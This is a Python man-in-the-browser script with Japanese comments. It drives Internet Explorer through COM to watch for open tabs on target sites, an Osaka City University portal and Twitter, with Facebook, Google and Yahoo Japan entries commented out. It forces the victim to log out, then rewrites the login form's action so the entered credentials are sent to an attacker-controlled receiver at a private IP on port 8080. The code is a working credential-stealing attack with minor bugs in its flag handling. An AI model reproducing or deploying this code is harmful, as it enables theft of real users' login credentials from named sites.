# -*- coding: utf-8 -*-
import win32com.client
import time
import urllib.request
import urllib.parse

data_receiver = "http://192.168.208.130:8080/"

target_sites = {}

target_sites["www.portal.osaka-cu.ac.jp"] = {
    "logout_url": "https://pwchg.auth.osaka-cu.ac.jp/logoff.html",
    "logout_form": None,
    "login_url": "www.portal.osaka-cu.ac.jp",
    "login_form_index": 0,
    "owned": False,
    "flag":False
}
'''
target_sites["www.facebook.com"] = \
    {"logout_url"       : None,
     "logout_form"      : "logout_form",
     "login_form_index" : 0,
     "owned"            : False}

target_sites["accounts.google.com"] = \
    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form"      : None,
     "login_form_index" : 0,
     "owned"            : False}

target_sites["jp.mg5.mail.yahoo.co.jp"]={
    "logout_url":"https://login.yahoo.co.jp/config/login?logout=1&amp;.intl=jp&amp;.done=https://mail.yahoo.co.jp&amp;.src=ym",
    "logout_form":None,
    "login_form_index":0,
    "login_url":"https://login.yahoo.co.jp/config/login",
    "owned":False
}
'''
target_sites["twitter.com"]={
    "logout_url":None,
    "logout_form":"signout-form",
    "login_form_index":0,
    "owned":False,
    "login_url":"https://twitter.com/login"
}


#複数のGmailドメイン用に同じ標的サイトを指摘する
#target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
#target_sites["mail.google.com"] = target_sites["accounts.google.com"]
#target_sites["login.yahooo.co.jp"]=target_sites["jp.mg5.mail.yahoo.co.jp"]
#target_sites["ausv.auth.osaka-cu.ac.jp"]=target_sites["www.portal.osaka-cu.ac.jp"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):

    #ブラウザがページをロードし終えるのを待つ
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

while True:

    for browser in windows:

        url = urllib.parse.urlparse(browser.LocationUrl)

        if url.hostname in target_sites:

            if target_sites[url.hostname]["owned"]:
                continue

            #もし該当のURLを発見したら、リダイレクトを行う
            if target_sites[url.hostname]["logout_url"] and target_sites[url.hostname]["flag"]==False:

                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
                target_sites["flag"]=True
            else:

                #ドキュメント中のすべての要素を取得する
                full_doc = browser.Document.all

                #ログアウトフォームを検索
                for i in full_doc:

                    try:

                        #ログアウトのフォームを検出してsubmitする
                        if i.id == target_sites[url.hostname]["logout_form"]:

                            i.submit()
                            wait_for_browser(browser)
                            target_sites["flag"]=True

                    except:
                        pass

            #ログインフォームを改ざんする
            try:
                if target_sites[url.hostname]["login_url"]:
                    browser.Navigate(target_sites[url.hostname]["login_url"])
                    wait_for_browser(browser)

                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.request.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "{0}{1}".format(data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True

            except:
                pass

        time.sleep(5)

